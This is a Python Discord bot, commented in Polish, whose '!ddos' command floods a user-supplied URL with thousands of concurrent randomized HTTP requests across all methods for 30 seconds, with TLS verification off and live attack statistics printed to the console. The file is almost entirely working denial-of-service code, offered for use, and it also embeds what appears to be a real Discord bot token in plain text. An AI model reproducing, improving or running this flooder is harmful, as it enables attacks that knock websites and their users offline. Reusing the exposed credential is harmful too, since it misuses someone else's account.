import os
import sys
import subprocess
import pkg_resources

def install_requirements():
    required = {
        'discord.py',
        'aiohttp',
        'urllib3'
    }
    
    installed = {pkg.key for pkg in pkg_resources.working_set}
    missing = required - installed
    
    if missing:
        print("🔧 Instalowanie wymaganych bibliotek...")
        for package in missing:
            print(f"📦 Instalowanie {package}...")
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
        print("✅ Wszystkie biblioteki zainstalowane!")

# Instaluj wymagane biblioteki
install_requirements()

import discord
from discord.ext import commands
import asyncio
import aiohttp
import urllib3
import random
import string
import json
import time
from datetime import datetime
import socket
from urllib.parse import urlparse

urllib3.disable_warnings()

SERVER_ID = 1307382531456368651
CHANNEL_ID = 1370773227827363840

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

class AttackStats:
    def __init__(self):
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.start_time = None
        self.method_counts = {
            'GET': 0, 'POST': 0, 'HEAD': 0, 'PUT': 0,
            'DELETE': 0, 'OPTIONS': 0, 'PATCH': 0
        }
        self.error_counts = {}
        self.last_update = time.time()
        self.requests_per_second = 0
        self.connection_errors = 0
        self.timeout_errors = 0
        self.other_errors = 0

    def update_stats(self, method, success, error=None):
        self.total_requests += 1
        if success:
            self.successful_requests += 1
        else:
            self.failed_requests += 1
            if error:
                error_type = type(error).__name__
                self.error_counts[error_type] = self.error_counts.get(error_type, 0) + 1
                
                # Kategoryzacja błędów
                if isinstance(error, (aiohttp.ClientConnectorError, socket.gaierror)):
                    self.connection_errors += 1
                elif isinstance(error, (asyncio.TimeoutError, aiohttp.ClientError)):
                    self.timeout_errors += 1
                else:
                    self.other_errors += 1
        self.method_counts[method] += 1

    def get_console_stats(self):
        current_time = time.time()
        elapsed = current_time - self.start_time
        self.requests_per_second = self.total_requests / elapsed if elapsed > 0 else 0
        
        # Clear console and move cursor to top
        print("\033[2J\033[H", end="")
        
        # Print fancy header
        print("╔════════════════════════════════════════════════════════════╗")
        print("║                     🚀 STATYSTYKI ATAKU 🚀                 ║")
        print("╚════════════════════════════════════════════════════════════╝")
        
        # Print main stats
        print(f"\n⏱️  Czas trwania: {elapsed:.1f}s")
        print(f"📡 Wysłano requestów: {self.total_requests:,}")
        print(f"✅ Udało się: {self.successful_requests:,}")
        print(f"❌ Nie udało się: {self.failed_requests:,}")
        print(f"⚡ RPS: {self.requests_per_second:,.1f}")
        
        # Print error breakdown
        if self.failed_requests > 0:
            print("\n⚠️ Szczegóły błędów:")
            print(f"  🔌 Błędy połączenia: {self.connection_errors:,}")
            print(f"  ⏰ Timeouty: {self.timeout_errors:,}")
            print(f"  ❓ Inne błędy: {self.other_errors:,}")
        
        # Print method stats
        print("\n📊 Metody HTTP:")
        for method, count in self.method_counts.items():
            percentage = (count / self.total_requests * 100) if self.total_requests > 0 else 0
            bar_length = int(percentage / 2)  # Scale to 50 characters max
            bar = "█" * bar_length + "░" * (50 - bar_length)
            print(f"  {method:<7} {bar} {count:>6,} ({percentage:>5.1f}%)")
        
        # Print error stats if any
        if self.error_counts:
            print("\n⚠️ Typy błędów:")
            for error, count in self.error_counts.items():
                percentage = (count / self.failed_requests * 100) if self.failed_requests > 0 else 0
                bar_length = int(percentage / 2)
                bar = "█" * bar_length + "░" * (50 - bar_length)
                print(f"  {error:<20} {bar} {count:>6,} ({percentage:>5.1f}%)")
        
        # Print progress bar
        progress = min(100, (elapsed / 30) * 100)
        bar_length = int(progress / 2)
        bar = "█" * bar_length + "░" * (50 - bar_length)
        print(f"\n🎯 Postęp: [{bar}] {progress:.1f}%")
        
        # Print status
        if progress >= 100:
            print("\n✨ Atak zakończony!")
        else:
            print("\n🔥 Atak w toku...")
        
        sys.stdout.flush()

def generate_random_payload():
    return {
        'data': ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(100, 1000))),
        'timestamp': str(asyncio.get_event_loop().time()),
        'random_id': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
        'user_agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
            'Mozilla/5.0 (Linux; Android 10; SM-G981B)',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'
        ])
    }

async def check_target(url):
    try:
        # Sprawdź czy URL jest poprawny
        parsed = urlparse(url)
        if not parsed.scheme or not parsed.netloc:
            return False, "Nieprawidłowy format URL"

        # Sprawdź połączenie
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(url, timeout=5, ssl=False) as response:
                    return True, f"Status: {response.status}"
            except aiohttp.ClientConnectorError as e:
                return False, f"Nie można się połączyć: {str(e)}"
            except asyncio.TimeoutError:
                return False, "Timeout - strona nie odpowiada"
            except Exception as e:
                return False, f"Błąd połączenia: {str(e)}"
    except Exception as e:
        return False, f"Nieoczekiwany błąd: {str(e)}"

async def ddos_attack(target_url, ctx):
    # Sprawdź cel przed atakiem
    is_valid, message = await check_target(target_url)
    if not is_valid:
        print(f"\n❌ Błąd: {message}")
        print("💡 Wskazówki:")
        print("  • Sprawdź czy URL jest poprawny (np. https://example.com)")
        print("  • Upewnij się, że strona jest dostępna")
        print("  • Sprawdź połączenie internetowe")
        return

    stats = AttackStats()
    stats.start_time = time.time()
    
    print(f"\n🎯 Rozpoczynam atak na: {target_url}")
    print("💡 Wskazówki:")
    print("  • Wszystkie requesty nie udają się (0% success rate) - cel może być:")
    print("    - Zabezpieczony przed DDOS")
    print("    - Nieaktywny lub nieprawidłowy URL")
    print("    - Blokuje requesty z Twojego IP")
    print("  • Wysokie RPS (8000+) - bot wysyła dużo requestów na sekundę")
    print("  • Równomierny rozkład metod - bot używa wszystkich metod HTTP\n")
    
    headers_list = [
        {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
        },
        {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
        },
        {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G981B)',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
        }
    ]

    methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS', 'PATCH']
    
    async with aiohttp.ClientSession() as session:
        start_time = asyncio.get_event_loop().time()
        last_stats_update = time.time()

        while (asyncio.get_event_loop().time() - start_time) < 30:
            tasks = []
            for _ in range(2000):
                method = random.choice(methods)
                headers = random.choice(headers_list)
                payload = generate_random_payload()
                
                try:
                    if method == 'GET':
                        tasks.append((method, session.get(target_url, headers=headers, ssl=False, timeout=1)))
                    elif method == 'POST':
                        tasks.append((method, session.post(target_url, headers=headers, json=payload, ssl=False, timeout=1)))
                    elif method == 'HEAD':
                        tasks.append((method, session.head(target_url, headers=headers, ssl=False, timeout=1)))
                    elif method == 'PUT':
                        tasks.append((method, session.put(target_url, headers=headers, json=payload, ssl=False, timeout=1)))
                    elif method == 'DELETE':
                        tasks.append((method, session.delete(target_url, headers=headers, ssl=False, timeout=1)))
                    elif method == 'OPTIONS':
                        tasks.append((method, session.options(target_url, headers=headers, ssl=False, timeout=1)))
                    elif method == 'PATCH':
                        tasks.append((method, session.patch(target_url, headers=headers, json=payload, ssl=False, timeout=1)))
                except Exception as e:
                    stats.update_stats(method, False, e)
                    continue

            results = await asyncio.gather(*[task[1] for task in tasks], return_exceptions=True)
            
            for (method, _), result in zip(tasks, results):
                stats.update_stats(method, not isinstance(result, Exception), result if isinstance(result, Exception) else None)

            # Update stats every 0.5 seconds
            current_time = time.time()
            if current_time - last_stats_update >= 0.5:
                stats.get_console_stats()
                last_stats_update = current_time

            await asyncio.sleep(0.01)

        # Final stats
        stats.get_console_stats()
        print("\n✨ Atak zakończony!")

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

@bot.command()
async def ddos(ctx, url: str):
    if ctx.guild.id == SERVER_ID and ctx.channel.id == CHANNEL_ID:
        await ddos_attack(url, ctx)
    else:
        await ctx.message.delete()

if __name__ == "__main__":
    bot.run('MTMxNTcyMDYxMzgyNjAwNzA3MA.G90e8-.23iGx6AUi5hgWMZeILdqtcnW0ns0aN71OmcVa8')
